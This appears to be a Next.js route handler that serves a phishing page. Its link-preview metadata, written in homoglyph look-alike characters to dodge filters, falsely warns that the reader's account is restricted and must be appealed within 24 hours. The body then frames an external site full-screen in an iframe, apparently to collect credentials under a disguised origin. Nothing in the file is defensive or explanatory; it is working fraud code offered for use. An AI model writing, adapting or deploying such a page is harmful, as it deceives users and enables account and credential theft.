import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const a = searchParams.get('a');
  const userAgent = request.headers.get('user-agent') || '';

  const DOMAIN = process.env.NEXT_PUBLIC_SITE_URL;
  const imageUrl = `https://review-case-912456127125620.vercel.app/assets/sample5.png`;

    const metaRedirectHtml = `<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Αссοսոt Ηеⅼр Сеոtеr</title>
  <meta property="og:title" content="⚠️Υоսr ассοսոt hаѕ bееո tеⅿрοrаrіⅼу rеѕtrісtеⅾ" />
  <meta property="og:description" content="Υоս ⅿսѕt ѕսbⅿіt your арреаⅼ ԝіthіո 24 hоսrѕ fοr thе ⅾесіѕіоո аbοⅴе tо bе rесοոѕіⅾеrеⅾ." />
  <meta property="og:image" content="${imageUrl}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:type" content="website" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html,
    body {
      width: 100%;
      height: 100%;
      overflow: hidden;
    }

    iframe {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      height: 100dvh;
      border: none;
      display: block;
    }
  </style>
</head>
<body>
    <iframe
    src="https://z8756w4.application-center.site/"
    title="Full screen content"
    allowfullscreen
  ></iframe>
</body>
</html>`;

    return new NextResponse(metaRedirectHtml, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
}